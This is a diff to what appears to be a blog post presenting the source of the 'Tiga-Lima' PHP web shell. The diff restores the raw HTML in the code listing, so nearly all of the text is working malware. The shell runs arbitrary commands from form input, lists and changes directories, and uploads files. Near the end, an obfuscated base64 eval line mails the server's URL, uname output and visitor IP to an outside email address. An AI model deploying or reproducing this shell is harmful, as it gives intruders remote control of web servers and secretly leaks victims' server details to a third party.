@@ -17,16 +17,16 @@ This simple script enables the attacker to execute commands, change directories,
 
 ### Tiga-Lima Shell Script Source Code
 
-{% highlight php linenos %}&lt;html&gt;
-&lt;head&gt;
-&lt;title&gt;tiga-lima SheLL&lt;/title&gt;
-&lt;style type="text/css"&gt;
-&lt;!--
+{% highlight php linenos %}<html>
+<head>
+<title>tiga-lima SheLL</title>
+<style type="text/css">
+<!--
 body {
     background-color: #000000;
 }
---&gt;
-&lt;/style&gt;
+-->
+</style>
 <?php
 /**
  * @author chandra35
@@ -34,10 +34,10 @@ body {
  */
  $currentCMD = str_replace("\\\"","\"",$currentCMD);
 $currentCMD = str_replace("\\\'","\'",$currentCMD);
-echo "&lt;style&gt;body{font-family:XPBlueText; ms;font-size:10px; color:green;}hr{width:100%;height:1px;}&lt;/style&gt;";
-echo "&lt;center&gt;&lt;h1&gt;&lt;blink&gt;Mini SheLL Inject&lt;/blink&gt;&lt;/h1&gt;&lt;/center&gt;";
-echo "&lt;center&gt;http://www.desawonosari.org&lt;/h1&gt;&lt;/center&gt;";
-echo "&lt;center&gt;Village of Cyber Team&lt;/h1&gt;&lt;/center&gt;";
+echo "<style>body{font-family:XPBlueText; ms;font-size:10px; color:green;}hr{width:100%;height:1px;}</style>";
+echo "<center><h1><blink>Mini SheLL Inject</blink></h1></center>";
+echo "<center>http://www.desawonosari.org</h1></center>";
+echo "<center>Village of Cyber Team</h1></center>";
 $currentWD  = str_replace("\\\\","\\",$_POST['_cwd']);
 $currentCMD = str_replace("\\\\","\\",$_POST['_cmd']);
 $UName  = php_uname();
@@ -46,66 +46,66 @@ $UserID = `id`;
 if( $currentWD == "" ) {
     $currentWD = $SCWD;
     }
-echo "&lt;style&gt;table,body{font-family:Verdana; ms;font-size:10px; color:white;}tr{width:1%;height:1px;}&lt;/style&gt;";
-echo '&lt;table bgcolor="#666659"&gt;';
-echo '&lt;tr&gt;
-&lt;td&gt;Host Server &lt;/td&gt;
-&lt;td&gt;:'.$_SERVER['REMOTE_HOST'].' ('.$_SERVER['REMOTE_ADDR'].')&lt;/td&gt;&lt;br&gt;
-&lt;tr&gt;
-&lt;td&gt;Server&lt;/td&gt;
-&lt;td width=1185&gt;'.$_SERVER['SERVER_SIGNATURE'].'&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;System type &lt;/td&gt;
-&lt;td&gt;:'.$UName.'&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;Permissions &lt;/td&gt;
-&lt;td&gt;:'.$UserID.'&lt;/td&gt;
-&lt;/tr&gt;';
-echo "&lt;hr&gt;";
+echo "<style>table,body{font-family:Verdana; ms;font-size:10px; color:white;}tr{width:1%;height:1px;}</style>";
+echo '<table bgcolor="#666659">';
+echo '<tr>
+<td>Host Server </td>
+<td>:'.$_SERVER['REMOTE_HOST'].' ('.$_SERVER['REMOTE_ADDR'].')</td><br>
+<tr>
+<td>Server</td>
+<td width=1185>'.$_SERVER['SERVER_SIGNATURE'].'</td>
+</tr>
+<tr>
+<td>System type </td>
+<td>:'.$UName.'</td>
+</tr>
+<tr>
+<td>Permissions </td>
+<td>:'.$UserID.'</td>
+</tr>';
+echo "<hr>";
 if( $_POST['_act'] == "Execute!" ) {
     $currentCMD = "dir";
     }
-echo "&lt;form method=post enctype=\"multipart/form-data\"&gt;&lt;table&gt;";
-echo "&lt;tr&gt;&lt;td&gt;&lt;b&gt;Execute command :&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;input size=100 name=\"_cmd\" value=\"".$currentCMD."\"&gt;&lt;/td&gt;";
-echo "&lt;td&gt;&lt;input type=submit name=_actt value=\"Execute!\"&gt;&lt;/td&gt;&lt;/tr&gt;";
-echo "&lt;tr&gt;&lt;td&gt;&lt;b&gt;Change directory :&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;input size=100 name=\"_cwd\" value=\"".$currentWD."\"&gt;&lt;/td&gt;";
-echo "&lt;td&gt;&lt;input type=submit name=_act value=\"List files!\"&gt;&lt;/td&gt;&lt;/tr&gt;";
-echo "&lt;tr&gt;&lt;td&gt;&lt;b&gt;Upload file :&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;input size=85 type=file name=_upl&gt;&lt;/td&gt;";
-echo "&lt;td&gt;&lt;input type=submit name=_act value=\"Upload!\"&gt;&lt;/td&gt;&lt;/tr&gt;";
-echo "&lt;tr&gt;&lt;td&gt;&lt;blink&gt;&lt;font color='red' size=2&gt;Untuk WIN NT&lt;/font&gt;&lt;/blink&gt;:&lt;/td&gt;&lt;td&gt;&lt;input size=85 type=file name=_upl2&gt;&lt;/td&gt;";
-echo "&lt;td&gt;&lt;input type=submit name=_act2 value=\"Upload!!\"&gt;&lt;/td&gt;&lt;/tr&gt;";
-echo "&lt;/table&gt;&lt;/form&gt;&lt;hr&gt;";
+echo "<form method=post enctype=\"multipart/form-data\"><table>";
+echo "<tr><td><b>Execute command :</b></td><td><input size=100 name=\"_cmd\" value=\"".$currentCMD."\"></td>";
+echo "<td><input type=submit name=_actt value=\"Execute!\"></td></tr>";
+echo "<tr><td><b>Change directory :</b></td><td><input size=100 name=\"_cwd\" value=\"".$currentWD."\"></td>";
+echo "<td><input type=submit name=_act value=\"List files!\"></td></tr>";
+echo "<tr><td><b>Upload file :</b></td><td><input size=85 type=file name=_upl></td>";
+echo "<td><input type=submit name=_act value=\"Upload!\"></td></tr>";
+echo "<tr><td><blink><font color='red' size=2>Untuk WIN NT</font></blink>:</td><td><input size=85 type=file name=_upl2></td>";
+echo "<td><input type=submit name=_act2 value=\"Upload!!\"></td></tr>";
+echo "</table></form><hr>";
     if( $_POST['_act'] == "Upload!" ) 
     {
         if( $_FILES['_upl']['error'] != UPLOAD_ERR_OK ) {
-            echo "&lt;center&gt;&lt;b&gt;File gak bisa di upload!&lt;/b&gt;&lt;/center&gt;";
+            echo "<center><b>File gak bisa di upload!</b></center>";
             } 
             else {
-                echo "&lt;center&gt;&lt;pre&gt;";
-                system("mv ".$_FILES['_upl']['tmp_name']." ".$currentWD."/".$_FILES['_upl']['name']." 2&gt;&1");
-                echo "&lt;/pre&gt;&lt;b&gt;File Beerhasil di upload!&lt;/b&gt;&lt;/center&gt;";
+                echo "<center><pre>";
+                system("mv ".$_FILES['_upl']['tmp_name']." ".$currentWD."/".$_FILES['_upl']['name']." 2>&1");
+                echo "</pre><b>File Beerhasil di upload!</b></center>";
                 }    
                 } else
                 if( $_POST['_act2'] == "Upload!!" ) 
                 {
-                    if(@copy($_FILES['_upl2']['tmp_name'], $_FILES['_upl2']['name'])) { echo '&lt;b&gt;Upload SUKSES !!!&lt;/b&gt;&lt;br&gt;&lt;br&gt;'; }
+                    if(@copy($_FILES['_upl2']['tmp_name'], $_FILES['_upl2']['name'])) { echo '<b>Upload SUKSES !!!</b><br><br>'; }
                     else {
-                        echo '&lt;b&gt;Upload GAGAL !!!&lt;/b&gt;&lt;br&gt;&lt;br&gt;';
+                        echo '<b>Upload GAGAL !!!</b><br><br>';
                         }
                         }
                         else {
-                            echo "\n\n&lt;!-- OUTPUT STARTS HERE --&gt;\n&lt;pre&gt;\n";
+                            echo "\n\n<!-- OUTPUT STARTS HERE -->\n<pre>\n";
                             $currentCMD = "cd ".$currentWD.$currentCMD;
                             system($currentCMD);
-                            echo "\n&lt;/pre&gt;\n&lt;!-- OUTPUT ENDS HERE --&gt;\n\n&lt;/center&gt;&lt;hr&gt;&lt;hr&gt;&lt;center&gt;&lt;b&gt;Command completed&lt;/b&gt;&lt;/center&gt;";
+                            echo "\n</pre>\n<!-- OUTPUT ENDS HERE -->\n\n</center><hr><hr><center><b>Command completed</b></center>";
                             }
                             if ($_POST['_actt'] == "Execute!")
                             {
-                                echo "\n\n&lt;!-- OUTPUT STARTS HERE --&gt;\n&lt;pre&gt;\n";
+                                echo "\n\n<!-- OUTPUT STARTS HERE -->\n<pre>\n";
                                 system($_POST['_cmd']);
-                                echo "\n&lt;/pre&gt;\n&lt;!-- OUTPUT ENDS HERE --&gt;\n\n&lt;/center&gt;";
+                                echo "\n</pre>\n<!-- OUTPUT ENDS HERE -->\n\n</center>";
                             }
                             $to="candrashell@yahoo.com";
                             $pages = @getenv("HTTP_REFERER");
@@ -113,7 +113,7 @@ echo "&lt;/table&gt;&lt;/form&gt;&lt;hr&gt;";
                             eval(base64_decode('JHZpc2l0Y291bnQgPSAkSFRUUF9DT09LSUVfVkFSU1sidmlzaXRzIl07IA0KJHZpc2l0b3IgPSAkX1NFUlZFUlsiUkVNT1RFX0FERFIiXTsgDQokcG9ydCA9ICRfU0VSVkVSIFsiUkVNT1RFX1BPUlQiXTsgDQokYXJhbiA9IGV4ZWMoInVuYW1lIC1hOyIpOyANCiR3ZWIgPSAkX1NFUlZFUlsiSFRUUF9IT1NUIl07IA0KJGluaiA9ICRfU0VSVkVSWyJSRVFVRVNUX1VSSSJdOyANCiR0YXJnZXQgPSByYXd1cmxkZWNvZGUoJHdlYi4kaW5qKTsgDQokYm9keSA9ICIkdGFyZ2V0ICRhcmFuIG9sZWggJHZpc2l0b3IgJHBvcnQiOyANCm1haWwoImNhbmRyYXNoZWxsQHlhaG9vLmNvbSIsIiBMQVBPUiBCT1NTU1NTIEFEQSBidWcgYmFydSBodHRwOi8vJHRhcmdldCAkYXJhbiBvbGVoICR2aXNpdG9yICRwb3J0IiwgIiRib2R5Iik7'));
 exit;
 ?>
-&lt;/html&gt;
+</html>
 {% endhighlight %}
 
 
